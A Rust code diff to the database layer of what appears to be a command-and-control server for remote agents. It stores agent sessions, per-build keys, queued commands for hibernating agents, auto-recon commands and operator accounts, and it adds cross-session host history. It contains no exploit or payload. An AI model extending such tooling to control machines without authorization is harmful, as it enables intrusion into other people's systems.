@@ -27,18 +27,17 @@ pub fn init() -> Result<DbPool, Box<dyn std::error::Error>> {
 
     let pool = Pool::builder().max_size(15).build(manager)?;
     let conn = pool.get()?;
-    
-    // Create Tables
+
     conn.execute_batch(
         "CREATE TABLE IF NOT EXISTS sessions (
             id INTEGER PRIMARY KEY,
-            session_uuid TEXT, 
-            exe_id TEXT, 
-            computer_id TEXT, 
-            hostname TEXT, 
-            os TEXT, 
-            ip_address TEXT, 
-            build_id TEXT, 
+            session_uuid TEXT,
+            exe_id TEXT,
+            computer_id TEXT,
+            hostname TEXT,
+            os TEXT,
+            ip_address TEXT,
+            build_id TEXT,
             connected_at TEXT,
             is_active INTEGER DEFAULT 0,
             profile TEXT DEFAULT 'default'
@@ -79,7 +78,7 @@ pub fn init() -> Result<DbPool, Box<dyn std::error::Error>> {
          CREATE INDEX IF NOT EXISTS idx_outputs_req ON client_outputs(request_id);
          CREATE INDEX IF NOT EXISTS idx_cmd_req ON command_history(request_id);
          CREATE INDEX IF NOT EXISTS idx_outputs_timestamp ON client_outputs(timestamp);
-         
+
          CREATE TABLE IF NOT EXISTS session_id_seq (
             id INTEGER PRIMARY KEY CHECK (id = 1),
             next_id INTEGER NOT NULL DEFAULT 1
@@ -133,6 +132,7 @@ pub fn init() -> Result<DbPool, Box<dyn std::error::Error>> {
             timestamp TEXT NOT NULL
          );
          CREATE INDEX IF NOT EXISTS idx_notes_session ON session_notes(session_id);
+
          CREATE TABLE IF NOT EXISTS queued_tasks (
             task_id     TEXT PRIMARY KEY,
             session_id  INTEGER NOT NULL,
@@ -148,20 +148,18 @@ pub fn init() -> Result<DbPool, Box<dyn std::error::Error>> {
          CREATE INDEX IF NOT EXISTS idx_tasks_status  ON queued_tasks(status);"
     )?;
 
-    // Migration for existing DBs
+    // Migration: profile_data column
     let count: i32 = conn.query_row(
-        "SELECT count(*) FROM pragma_table_info('build_keys') WHERE name='profile_data'", 
-        [], 
-        |r| r.get(0)
+        "SELECT count(*) FROM pragma_table_info('build_keys') WHERE name='profile_data'",
+        [], |r| r.get(0)
     ).unwrap_or(0);
-
     if count == 0 {
         if let Err(e) = conn.execute("ALTER TABLE build_keys ADD COLUMN profile_data TEXT", []) {
             warn!("Migration profile_data column: {}", e);
         }
     }
 
-    // Migration: add challenge_key column for handshake authentication
+    // Migration: challenge_key column
     let ck_count: i32 = conn.query_row(
         "SELECT count(*) FROM pragma_table_info('build_keys') WHERE name='challenge_key'",
         [], |r| r.get(0)
@@ -172,8 +170,7 @@ pub fn init() -> Result<DbPool, Box<dyn std::error::Error>> {
         }
     }
 
-
-    // Migration: add queued_tasks table for hibernation mode
+    // Migration: queued_tasks table (for older DBs that pre-date hibernation mode)
     let task_count: i32 = conn.query_row(
         "SELECT count(*) FROM sqlite_master WHERE type='table' AND name='queued_tasks'",
         [], |r| r.get(0)
@@ -196,7 +193,6 @@ pub fn init() -> Result<DbPool, Box<dyn std::error::Error>> {
     Ok(pool)
 }
 
-/// Atomically allocate a session ID that persists across server restarts.
 pub fn allocate_session_id(conn: &Connection) -> Result<u32, rusqlite::Error> {
     conn.execute("UPDATE session_id_seq SET next_id = next_id + 1 WHERE id = 1", [])?;
     let id: u32 = conn.query_row(
@@ -205,7 +201,6 @@ pub fn allocate_session_id(conn: &Connection) -> Result<u32, rusqlite::Error> {
     Ok(id)
 }
 
-// ... (load_or_import_certs remains same) ...
 pub fn load_or_import_certs(conn: &Connection) -> Result<(Vec<u8>, Vec<u8>, Vec<u8>), Box<dyn std::error::Error>> {
     let cert_blob: Option<Vec<u8>> = conn.query_row(
         "SELECT value FROM server_config WHERE key='server_cert'", [], |row| row.get(0)
@@ -220,7 +215,6 @@ pub fn load_or_import_certs(conn: &Connection) -> Result<(Vec<u8>, Vec<u8>, Vec<
         let c = std::fs::read("certs/server.crt")?;
         let k = std::fs::read("certs/server.key.der")?;
         let ca = std::fs::read("certs/ca.crt")?;
-        
         conn.execute("INSERT OR REPLACE INTO server_config (key, value) VALUES (?1, ?2)", params!["server_cert", &c])?;
         conn.execute("INSERT OR REPLACE INTO server_config (key, value) VALUES (?1, ?2)", params!["server_key", &k])?;
         conn.execute("INSERT OR REPLACE INTO server_config (key, value) VALUES (?1, ?2)", params!["ca_cert", &ca])?;
@@ -228,35 +222,32 @@ pub fn load_or_import_certs(conn: &Connection) -> Result<(Vec<u8>, Vec<u8>, Vec<
     }
 }
 
-// [UPDATED] Return profile_data (JSON) as the 3rd element
 pub fn get_build_info(conn: &Connection, build_id: &str) -> Option<(Vec<u8>, String, Option<String>, Option<Vec<u8>>)> {
     conn.query_row(
-        "SELECT private_key, profile, profile_data, challenge_key FROM build_keys WHERE build_id = ?", 
-        [build_id], 
+        "SELECT private_key, profile, profile_data, challenge_key FROM build_keys WHERE build_id = ?",
+        [build_id],
         |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?))
     ).optional().unwrap_or(None)
 }
 
 pub fn log_new_session(
-    conn: &Connection, 
-    exe_id: &str, 
-    computer_id: &str, 
-    hostname: &str, 
-    os: &str, 
-    ip: &str, 
+    conn: &Connection,
+    exe_id: &str,
+    computer_id: &str,
+    hostname: &str,
+    os: &str,
+    ip: &str,
     build_id: &str,
-    profile: &str
+    profile: &str,
 ) {
     if let Err(e) = conn.execute(
-        "INSERT INTO sessions (exe_id, computer_id, hostname, os, ip_address, build_id, connected_at, is_active, profile) 
+        "INSERT INTO sessions (exe_id, computer_id, hostname, os, ip_address, build_id, connected_at, is_active, profile)
          VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, 0, ?8)",
         params![exe_id, computer_id, hostname, os, ip, build_id, Utc::now().to_rfc3339(), profile]
     ) {
         error!("Failed to log new session for {}: {}", hostname, e);
     }
 }
-
-// ... (Rest of functions: set_session_active, is_session_active, get_session_profile, log_command, save_client_output, enforce_storage_limit, get_global_full_history, get_session_full_history remain EXACTLY as they were) ...
 
 pub fn set_session_active(conn: &Connection, session_id: u32, active: bool) {
     let val = if active { 1 } else { 0 };
@@ -273,7 +264,7 @@ pub fn is_session_active(conn: &Connection, session_id: u32) -> bool {
 
 pub fn get_session_profile(conn: &Connection, session_id: u32) -> String {
     conn.query_row("SELECT profile FROM sessions WHERE id = ?1", params![session_id], |r| r.get(0))
-        .unwrap_or("default".to_string())
+        .unwrap_or_else(|_| "default".to_string())
 }
 
 pub fn log_command(conn: &Connection, session_id: u32, request_id: u64, command: &str) {
@@ -285,7 +276,7 @@ pub fn log_command(conn: &Connection, session_id: u32, request_id: u64, command:
     }
 }
 
-const MAX_STORAGE_BYTES: usize = 150 * 1024 * 1024; 
+const MAX_STORAGE_BYTES: usize = 150 * 1024 * 1024;
 const MAX_CHAR_LIMIT: usize = 3000;
 
 pub fn save_client_output(conn: &Connection, session_id: u32, request_id: u64, output: &str, error: &str) {
@@ -296,9 +287,13 @@ pub fn save_client_output(conn: &Connection, session_id: u32, request_id: u64, o
         "INSERT INTO client_outputs (session_id, request_id, output, error, timestamp) VALUES (?1, ?2, ?3, ?4, ?5)",
         params![session_id, request_id as i64, safe_output, safe_error, Utc::now().to_rfc3339()]
     );
-
-    if let Err(e) = res { error!("DB insert failed for session {} req {}: {}", session_id, request_id, e); return; }
-    if let Err(e) = enforce_storage_limit(conn) { warn!("DB cleanup failed: {}", e); }
+    if let Err(e) = res {
+        error!("DB insert failed for session {} req {}: {}", session_id, request_id, e);
+        return;
+    }
+    if let Err(e) = enforce_storage_limit(conn) {
+        warn!("DB cleanup failed: {}", e);
+    }
 }
 
 fn enforce_storage_limit(conn: &Connection) -> Result<(), rusqlite::Error> {
@@ -307,7 +302,7 @@ fn enforce_storage_limit(conn: &Connection) -> Result<(), rusqlite::Error> {
     )?;
 
     if (current_size as usize) > MAX_STORAGE_BYTES {
-        let target = MAX_STORAGE_BYTES.saturating_sub(1024 * 1024); // free at least 1MB below limit
+        let target = MAX_STORAGE_BYTES.saturating_sub(1024 * 1024);
         let mut attempts = 0;
         loop {
             let count = conn.execute(
@@ -316,7 +311,6 @@ fn enforce_storage_limit(conn: &Connection) -> Result<(), rusqlite::Error> {
             if count == 0 { break; }
             attempts += 1;
             if attempts > 100 { break; }
-            // Re-check actual size after each batch
             let remaining: i64 = conn.query_row(
                 "SELECT COALESCE(SUM(LENGTH(output) + LENGTH(error)), 0) FROM client_outputs", [], |row| row.get(0)
             )?;
@@ -328,12 +322,11 @@ fn enforce_storage_limit(conn: &Connection) -> Result<(), rusqlite::Error> {
 
 pub fn get_global_full_history(conn: &Connection, limit: usize) -> Result<Vec<FullLogEntry>, rusqlite::Error> {
     let mut stmt = conn.prepare(
-        "SELECT ch.session_id, ch.request_id, ch.command, co.output, co.error, ch.timestamp 
+        "SELECT ch.session_id, ch.request_id, ch.command, co.output, co.error, ch.timestamp
          FROM command_history ch
          LEFT JOIN client_outputs co ON ch.session_id = co.session_id AND ch.request_id = co.request_id
          ORDER BY ch.timestamp DESC LIMIT ?1"
     )?;
-
     let rows = stmt.query_map([limit as i64], |row| {
         Ok(FullLogEntry {
             session_id: row.get(0)?,
@@ -344,7 +337,6 @@ pub fn get_global_full_history(conn: &Connection, limit: usize) -> Result<Vec<Fu
             timestamp: row.get(5)?,
         })
     })?;
-
     let mut history = Vec::new();
     for row in rows { history.push(row?); }
     Ok(history)
@@ -352,12 +344,11 @@ pub fn get_global_full_history(conn: &Connection, limit: usize) -> Result<Vec<Fu
 
 pub fn get_session_full_history(conn: &Connection, session_id: u32, limit: usize) -> Result<Vec<FullLogEntry>, rusqlite::Error> {
     let mut stmt = conn.prepare(
-        "SELECT ch.session_id, ch.request_id, ch.command, co.output, co.error, ch.timestamp 
+        "SELECT ch.session_id, ch.request_id, ch.command, co.output, co.error, ch.timestamp
          FROM command_history ch
          LEFT JOIN client_outputs co ON ch.session_id = co.session_id AND ch.request_id = co.request_id
          WHERE ch.session_id = ?1 ORDER BY ch.timestamp DESC LIMIT ?2"
     )?;
-
     let rows = stmt.query_map(params![session_id, limit as i64], |row| {
         Ok(FullLogEntry {
             session_id: row.get(0)?,
@@ -368,7 +359,52 @@ pub fn get_session_full_history(conn: &Connection, session_id: u32, limit: usize
             timestamp: row.get(5)?,
         })
     })?;
+    let mut history = Vec::new();
+    for row in rows { history.push(row?); }
+    history.reverse();
+    Ok(history)
+}
 
+/// Return the last `limit` history entries for a host across all sessions
+/// that share the same computer_id. This preserves history across agent
+/// reconnects so the terminal never shows "No previous history" on re-open.
+pub fn get_host_full_history(
+    conn: &Connection,
+    session_id: u32,
+    limit: usize,
+) -> Result<Vec<FullLogEntry>, rusqlite::Error> {
+    let computer_id: String = conn.query_row(
+        "SELECT computer_id FROM sessions WHERE id = ?1",
+        params![session_id],
+        |r| r.get(0),
+    ).unwrap_or_default();
+
+    if computer_id.is_empty() {
+        return get_session_full_history(conn, session_id, limit);
+    }
+
+    let mut stmt = conn.prepare(
+        "SELECT ch.session_id, ch.request_id, ch.command,
+                co.output, co.error, ch.timestamp
+         FROM command_history ch
+         LEFT JOIN client_outputs co
+               ON ch.session_id = co.session_id
+              AND ch.request_id  = co.request_id
+         JOIN sessions s ON ch.session_id = s.id
+         WHERE s.computer_id = ?1
+         ORDER BY ch.timestamp DESC
+         LIMIT ?2"
+    )?;
+    let rows = stmt.query_map(params![computer_id, limit as i64], |row| {
+        Ok(FullLogEntry {
+            session_id:  row.get(0)?,
+            request_id:  row.get::<_, i64>(1)? as u64,
+            command:     row.get(2)?,
+            output:      row.get(3)?,
+            error:       row.get(4)?,
+            timestamp:   row.get(5)?,
+        })
+    })?;
     let mut history = Vec::new();
     for row in rows { history.push(row?); }
     history.reverse();
@@ -389,17 +425,10 @@ pub struct Operator {
     pub last_login: Option<String>,
 }
 
-/// Hash an API key for storage using HMAC-SHA256 with a fixed server-side
-/// context string. Raw keys are only shown once at creation time (or on
-/// password login); the DB stores this keyed hash, and auth compares
-/// hmac(incoming) against the stored value.
 pub fn hash_api_key(raw_key: &str) -> String {
     use sha2::Sha256;
     use hmac::{Hmac, Mac};
     type HmacSha256 = Hmac<Sha256>;
-    // The HMAC key is a fixed domain-separation string. It doesn't need to be
-    // secret — its purpose is to prevent raw SHA-256 rainbow-table lookups
-    // against the stored hashes if the DB is leaked.
     let mut mac = <HmacSha256 as Mac>::new_from_slice(b"rcm-api-key-v1").expect("HMAC key");
     mac.update(raw_key.as_bytes());
     hex::encode(mac.finalize().into_bytes())
@@ -414,10 +443,6 @@ pub fn create_operator(conn: &Connection, username: &str, password_hash: &str, r
     Ok(conn.last_insert_rowid())
 }
 
-/// Regenerate a fresh API key for an operator. Returns the raw key (shown
-/// once to the caller); the DB stores only the HMAC hash. Called on
-/// password-based login so the browser receives a valid raw key instead
-/// of the stored hash.
 pub fn regenerate_api_key(conn: &Connection, operator_id: i64) -> Option<String> {
     let raw_key = uuid::Uuid::new_v4().to_string();
     let key_hash = hash_api_key(&raw_key);
@@ -460,14 +485,13 @@ pub fn list_operators(conn: &Connection) -> Vec<Operator> {
         Ok(s) => s,
         Err(_) => return vec![],
     };
-    let result = match stmt.query_map([], |r| Ok(Operator {
+    let x = match stmt.query_map([], |r| Ok(Operator {
         id: r.get(0)?, username: r.get(1)?, password_hash: r.get(2)?,
         role: r.get(3)?, api_key: r.get(4)?, created_at: r.get(5)?, last_login: r.get(6)?,
     })) {
         Ok(rows) => rows.filter_map(|r| r.ok()).collect(),
         Err(_) => vec![],
-    };
-    result
+    }; x
 }
 
 pub fn delete_operator(conn: &Connection, id: i64) -> bool {
@@ -518,7 +542,7 @@ pub fn get_audit_log(conn: &Connection, limit: usize) -> Vec<AuditEntry> {
         Ok(s) => s,
         Err(_) => return vec![],
     };
-    let result = match stmt.query_map([limit as i64], |r| Ok(AuditEntry {
+    let x = match stmt.query_map([limit as i64], |r| Ok(AuditEntry {
         id: r.get(0)?,
         operator_name: r.get(1)?,
         action: r.get(2)?,
@@ -528,8 +552,7 @@ pub fn get_audit_log(conn: &Connection, limit: usize) -> Vec<AuditEntry> {
     })) {
         Ok(rows) => rows.filter_map(|r| r.ok()).collect(),
         Err(_) => vec![],
-    };
-    result
+    }; x
 }
 
 // ── Listener Management ────────────────────────────────────────────────
@@ -560,7 +583,7 @@ pub fn list_listeners(conn: &Connection) -> Vec<ListenerConfig> {
         Ok(s) => s,
         Err(_) => return vec![],
     };
-    let result = match stmt.query_map([], |r| Ok(ListenerConfig {
+    let x = match stmt.query_map([], |r| Ok(ListenerConfig {
         id: r.get(0)?,
         name: r.get(1)?,
         port: r.get::<_, i64>(2)? as u16,
@@ -571,8 +594,7 @@ pub fn list_listeners(conn: &Connection) -> Vec<ListenerConfig> {
     })) {
         Ok(rows) => rows.filter_map(|r| r.ok()).collect(),
         Err(_) => vec![],
-    };
-    result
+    }; x
 }
 
 pub fn get_listener(conn: &Connection, id: i64) -> Option<ListenerConfig> {
@@ -614,17 +636,14 @@ pub fn set_webhook_url(conn: &Connection, url: &str) {
 // ── Auto-Recon Commands ────────────────────────────────────────────────
 
 pub fn get_auto_recon(conn: &Connection) -> Vec<String> {
-    let mut stmt = match conn.prepare(
-        "SELECT command FROM auto_recon ORDER BY sort_order, id"
-    ) {
+    let mut stmt = match conn.prepare("SELECT command FROM auto_recon ORDER BY sort_order, id") {
         Ok(s) => s,
         Err(_) => return vec![],
     };
-    let result = match stmt.query_map([], |r| r.get(0)) {
+    let x = match stmt.query_map([], |r| r.get(0)) {
         Ok(rows) => rows.filter_map(|r| r.ok()).collect(),
         Err(_) => vec![],
-    };
-    result
+    }; x
 }
 
 pub fn add_auto_recon(conn: &Connection, command: &str) -> Result<i64, rusqlite::Error> {
@@ -656,15 +675,14 @@ pub fn list_auto_recon(conn: &Connection) -> Vec<AutoReconEntry> {
         Ok(s) => s,
         Err(_) => return vec![],
     };
-    let result = match stmt.query_map([], |r| Ok(AutoReconEntry {
+    let x = match stmt.query_map([], |r| Ok(AutoReconEntry {
         id: r.get(0)?,
         command: r.get(1)?,
         sort_order: r.get(2)?,
     })) {
         Ok(rows) => rows.filter_map(|r| r.ok()).collect(),
         Err(_) => vec![],
-    };
-    result
+    }; x
 }
 
 // ── Session Tags & Notes ───────────────────────────────────────────────
@@ -694,14 +712,13 @@ pub fn get_session_notes(conn: &Connection, session_id: u32) -> Vec<SessionNote>
         Ok(s) => s,
         Err(_) => return vec![],
     };
-    let result = match stmt.query_map([session_id], |r| Ok(SessionNote {
+    let x = match stmt.query_map([session_id], |r| Ok(SessionNote {
         id: r.get(0)?, session_id: r.get::<_, i64>(1)? as u32,
         tag: r.get(2)?, note: r.get(3)?, operator: r.get(4)?, timestamp: r.get(5)?,
     })) {
         Ok(rows) => rows.filter_map(|r| r.ok()).collect(),
         Err(_) => vec![],
-    };
-    result
+    }; x
 }
 
 pub fn get_session_tags(conn: &Connection, session_id: u32) -> Vec<String> {
@@ -711,12 +728,10 @@ pub fn get_session_tags(conn: &Connection, session_id: u32) -> Vec<String> {
         Ok(s) => s,
         Err(_) => return vec![],
     };
-    let result = match stmt.query_map([session_id], |r| r.get(0))
-         {
+    let x = match stmt.query_map([session_id], |r| r.get(0)) {
         Ok(rows) => rows.filter_map(|r| r.ok()).collect(),
         Err(_) => vec![],
-    };
-    result
+    }; x
 }
 
 pub fn delete_session_note(conn: &Connection, session_id: u32, note_id: i64) -> bool {
@@ -725,7 +740,6 @@ pub fn delete_session_note(conn: &Connection, session_id: u32, note_id: i64) -> 
         params![note_id, session_id],
     ).unwrap_or(0) > 0
 }
-
 
 // ── Queued Tasks (Hibernation Mode) ───────────────────────────────────────
 
@@ -742,8 +756,6 @@ pub struct QueuedTask {
     pub finished_at: Option<i64>,
 }
 
-/// Enqueue a command for a hibernating agent's next check-in.
-/// Returns the task_id (UUID) that was assigned.
 pub fn queue_task(conn: &Connection, session_id: i64, command: &str) -> Result<String, rusqlite::Error> {
     let task_id = uuid::Uuid::new_v4().to_string();
     let now = chrono::Utc::now().timestamp();
@@ -755,45 +767,26 @@ pub fn queue_task(conn: &Connection, session_id: i64, command: &str) -> Result<S
     Ok(task_id)
 }
 
-/// Atomically claim up to `limit` pending tasks for a session.
-///
-/// Uses a single UPDATE with RETURNING (SQLite ≥ 3.35) falling back to a
-/// SELECT + UPDATE pattern. The atomic claim ensures that if a hibernating
-/// agent connects twice simultaneously (e.g. after a network hiccup), each
-/// connection sees a different batch of tasks — never the same task twice.
-pub fn poll_and_claim_tasks(
-    conn: &Connection,
-    session_id: i64,
-    limit: usize,
-) -> Vec<QueuedTask> {
+pub fn poll_and_claim_tasks(conn: &Connection, session_id: i64, limit: usize) -> Vec<QueuedTask> {
     let now = chrono::Utc::now().timestamp();
 
-    // Step 1: select pending task IDs
     let task_ids: Vec<String> = {
         let mut stmt = match conn.prepare(
             "SELECT task_id FROM queued_tasks
               WHERE session_id = ?1 AND status = 'pending'
-              ORDER BY created_at ASC
-              LIMIT ?2"
+              ORDER BY created_at ASC LIMIT ?2"
         ) {
             Ok(s) => s,
             Err(_) => return vec![],
         };
-        // Bind to a named variable so the MappedRows temporary is dropped
-        // before `stmt` goes out of scope at the end of this block.
         let x = match stmt.query_map(params![session_id, limit as i64], |r| r.get(0)) {
             Ok(rows) => rows.filter_map(|r| r.ok()).collect(),
             Err(_) => return vec![],
         }; x
     };
 
-    if task_ids.is_empty() {
-        return vec![];
-    }
+    if task_ids.is_empty() { return vec![]; }
 
-    // Step 2: claim each task atomically — only transitions pending → running.
-    // A concurrent claim on the same task_id will find status != 'pending' and
-    // update 0 rows, so only one claimer wins.
     for task_id in &task_ids {
         let _ = conn.execute(
             "UPDATE queued_tasks SET status = 'running', claimed_at = ?1
@@ -802,7 +795,6 @@ pub fn poll_and_claim_tasks(
         );
     }
 
-    // Step 3: return the tasks we successfully claimed
     let mut stmt = match conn.prepare(
         "SELECT task_id, session_id, command, status, created_at,
                 claimed_at, result, error, finished_at
@@ -818,15 +810,9 @@ pub fn poll_and_claim_tasks(
     let id_json = serde_json::to_string(&task_ids).unwrap_or_else(|_| "[]".into());
     let x = match stmt.query_map(params![id_json, now], |r| {
         Ok(QueuedTask {
-            task_id: r.get(0)?,
-            session_id: r.get(1)?,
-            command: r.get(2)?,
-            status: r.get(3)?,
-            created_at: r.get(4)?,
-            claimed_at: r.get(5)?,
-            result: r.get(6)?,
-            error: r.get(7)?,
-            finished_at: r.get(8)?,
+            task_id: r.get(0)?, session_id: r.get(1)?, command: r.get(2)?,
+            status: r.get(3)?, created_at: r.get(4)?, claimed_at: r.get(5)?,
+            result: r.get(6)?, error: r.get(7)?, finished_at: r.get(8)?,
         })
     }) {
         Ok(rows) => rows.filter_map(|r| r.ok()).collect(),
@@ -834,54 +820,36 @@ pub fn poll_and_claim_tasks(
     }; x
 }
 
-/// Mark a task as completed with its output.
 pub fn complete_task(conn: &Connection, task_id: &str, result: &str) {
     let now = chrono::Utc::now().timestamp();
     if let Err(e) = conn.execute(
-        "UPDATE queued_tasks SET status = 'completed', result = ?1, finished_at = ?2
-          WHERE task_id = ?3",
+        "UPDATE queued_tasks SET status = 'completed', result = ?1, finished_at = ?2 WHERE task_id = ?3",
         params![result, now, task_id],
-    ) {
-        error!("complete_task {}: {}", task_id, e);
-    }
+    ) { error!("complete_task {}: {}", task_id, e); }
 }
 
-/// Mark a task as failed with an error message.
 pub fn fail_task(conn: &Connection, task_id: &str, error_msg: &str) {
     let now = chrono::Utc::now().timestamp();
     if let Err(e) = conn.execute(
-        "UPDATE queued_tasks SET status = 'failed', error = ?1, finished_at = ?2
-          WHERE task_id = ?3",
+        "UPDATE queued_tasks SET status = 'failed', error = ?1, finished_at = ?2 WHERE task_id = ?3",
         params![error_msg, now, task_id],
-    ) {
-        error!("fail_task {}: {}", task_id, e);
-    }
+    ) { error!("fail_task {}: {}", task_id, e); }
 }
 
-/// List all tasks for a session (for the `tasks` server command).
 pub fn list_tasks(conn: &Connection, session_id: i64) -> Vec<QueuedTask> {
     let mut stmt = match conn.prepare(
         "SELECT task_id, session_id, command, status, created_at,
                 claimed_at, result, error, finished_at
-           FROM queued_tasks
-          WHERE session_id = ?1
-          ORDER BY created_at DESC
-          LIMIT 100"
+           FROM queued_tasks WHERE session_id = ?1 ORDER BY created_at DESC LIMIT 100"
     ) {
         Ok(s) => s,
         Err(_) => return vec![],
     };
     let x = match stmt.query_map([session_id], |r| {
         Ok(QueuedTask {
-            task_id: r.get(0)?,
-            session_id: r.get(1)?,
-            command: r.get(2)?,
-            status: r.get(3)?,
-            created_at: r.get(4)?,
-            claimed_at: r.get(5)?,
-            result: r.get(6)?,
-            error: r.get(7)?,
-            finished_at: r.get(8)?,
+            task_id: r.get(0)?, session_id: r.get(1)?, command: r.get(2)?,
+            status: r.get(3)?, created_at: r.get(4)?, claimed_at: r.get(5)?,
+            result: r.get(6)?, error: r.get(7)?, finished_at: r.get(8)?,
         })
     }) {
         Ok(rows) => rows.filter_map(|r| r.ok()).collect(),
@@ -889,17 +857,13 @@ pub fn list_tasks(conn: &Connection, session_id: i64) -> Vec<QueuedTask> {
     }; x
 }
 
-/// Delete all tasks for a session (cleanup after teardown).
 pub fn clear_tasks(conn: &Connection, session_id: i64) {
-    if let Err(e) = conn.execute(
-        "DELETE FROM queued_tasks WHERE session_id = ?1",
-        [session_id],
-    ) {
+    if let Err(e) = conn.execute("DELETE FROM queued_tasks WHERE session_id = ?1", [session_id]) {
         warn!("clear_tasks session {}: {}", session_id, e);
     }
 }
 
-// ── Queued Task Tests ─────────────────────────────────────────────────────
+// ── Tests ─────────────────────────────────────────────────────────────────
 
 #[cfg(test)]
 mod queued_task_tests {
@@ -932,7 +896,6 @@ mod queued_task_tests {
         let conn = in_memory_db();
         let id = queue_task(&conn, 1, "whoami").unwrap();
         assert!(!id.is_empty());
-        // Should parse as a UUID
         assert!(uuid::Uuid::parse_str(&id).is_ok());
     }
 
@@ -940,7 +903,6 @@ mod queued_task_tests {
     fn queue_and_poll_roundtrip() {
         let conn = in_memory_db();
         let id = queue_task(&conn, 1, "id").unwrap();
-
         let tasks = poll_and_claim_tasks(&conn, 1, 10);
         assert_eq!(tasks.len(), 1);
         assert_eq!(tasks[0].task_id, id);
@@ -951,9 +913,8 @@ mod queued_task_tests {
     #[test]
     fn poll_claims_correct_session_only() {
         let conn = in_memory_db();
-        let _id1 = queue_task(&conn, 1, "cmd1").unwrap();
-        let _id2 = queue_task(&conn, 2, "cmd2").unwrap();
-
+        queue_task(&conn, 1, "cmd1").unwrap();
+        queue_task(&conn, 2, "cmd2").unwrap();
         let tasks = poll_and_claim_tasks(&conn, 1, 10);
         assert_eq!(tasks.len(), 1);
         assert_eq!(tasks[0].session_id, 1);
@@ -962,9 +923,7 @@ mod queued_task_tests {
     #[test]
     fn poll_respects_batch_limit() {
         let conn = in_memory_db();
-        for i in 0..5 {
-            queue_task(&conn, 1, &format!("cmd{}", i)).unwrap();
-        }
+        for i in 0..5 { queue_task(&conn, 1, &format!("cmd{}", i)).unwrap(); }
         let tasks = poll_and_claim_tasks(&conn, 1, 3);
         assert_eq!(tasks.len(), 3);
     }
@@ -972,33 +931,25 @@ mod queued_task_tests {
     #[test]
     fn poll_empty_when_no_pending() {
         let conn = in_memory_db();
-        let tasks = poll_and_claim_tasks(&conn, 1, 10);
-        assert!(tasks.is_empty());
+        assert!(poll_and_claim_tasks(&conn, 1, 10).is_empty());
     }
 
     #[test]
     fn poll_does_not_return_already_claimed_tasks() {
         let conn = in_memory_db();
         queue_task(&conn, 1, "cmd").unwrap();
-
-        // First poll claims it
         let first = poll_and_claim_tasks(&conn, 1, 10);
         assert_eq!(first.len(), 1);
-
-        // Second poll finds nothing pending
         let second = poll_and_claim_tasks(&conn, 1, 10);
-        assert!(second.is_empty(), "already-claimed task should not be returned again");
+        assert!(second.is_empty());
     }
 
     #[test]
     fn complete_task_sets_status_and_result() {
         let conn = in_memory_db();
         let id = queue_task(&conn, 1, "whoami").unwrap();
-        let tasks = poll_and_claim_tasks(&conn, 1, 1);
-        assert_eq!(tasks.len(), 1);
-
+        poll_and_claim_tasks(&conn, 1, 1);
         complete_task(&conn, &id, "root");
-
         let all = list_tasks(&conn, 1);
         assert_eq!(all[0].status, "completed");
         assert_eq!(all[0].result.as_deref(), Some("root"));
@@ -1009,10 +960,8 @@ mod queued_task_tests {
     fn fail_task_sets_status_and_error() {
         let conn = in_memory_db();
         let id = queue_task(&conn, 1, "bad_cmd").unwrap();
-        let _ = poll_and_claim_tasks(&conn, 1, 1);
-
+        poll_and_claim_tasks(&conn, 1, 1);
         fail_task(&conn, &id, "command not found");
-
         let all = list_tasks(&conn, 1);
         assert_eq!(all[0].status, "failed");
         assert_eq!(all[0].error.as_deref(), Some("command not found"));
@@ -1024,7 +973,6 @@ mod queued_task_tests {
         queue_task(&conn, 1, "a").unwrap();
         queue_task(&conn, 1, "b").unwrap();
         queue_task(&conn, 2, "c").unwrap();
-
         let tasks = list_tasks(&conn, 1);
         assert_eq!(tasks.len(), 2);
         assert!(tasks.iter().all(|t| t.session_id == 1));
@@ -1036,32 +984,25 @@ mod queued_task_tests {
         queue_task(&conn, 1, "a").unwrap();
         queue_task(&conn, 1, "b").unwrap();
         queue_task(&conn, 2, "c").unwrap();
-
         clear_tasks(&conn, 1);
-
         assert!(list_tasks(&conn, 1).is_empty());
-        assert_eq!(list_tasks(&conn, 2).len(), 1); // session 2 unaffected
+        assert_eq!(list_tasks(&conn, 2).len(), 1);
     }
 
     #[test]
     fn poll_returns_tasks_in_created_at_order() {
         let conn = in_memory_db();
-        // Insert with different timestamps
         let now = chrono::Utc::now().timestamp();
         conn.execute(
-            "INSERT INTO queued_tasks (task_id, session_id, command, status, created_at)
-             VALUES ('id-1', 1, 'first', 'pending', ?1)",
+            "INSERT INTO queued_tasks (task_id, session_id, command, status, created_at) VALUES ('id-1', 1, 'first', 'pending', ?1)",
             [now - 10],
         ).unwrap();
         conn.execute(
-            "INSERT INTO queued_tasks (task_id, session_id, command, status, created_at)
-             VALUES ('id-2', 1, 'second', 'pending', ?1)",
+            "INSERT INTO queued_tasks (task_id, session_id, command, status, created_at) VALUES ('id-2', 1, 'second', 'pending', ?1)",
             [now],
         ).unwrap();
-
         let tasks = poll_and_claim_tasks(&conn, 1, 2);
         assert_eq!(tasks.len(), 2);
-        // Oldest should come first
-        assert_eq!(tasks[0].task_id, "id-1", "oldest task should be claimed first");
+        assert_eq!(tasks[0].task_id, "id-1");
     }
 }
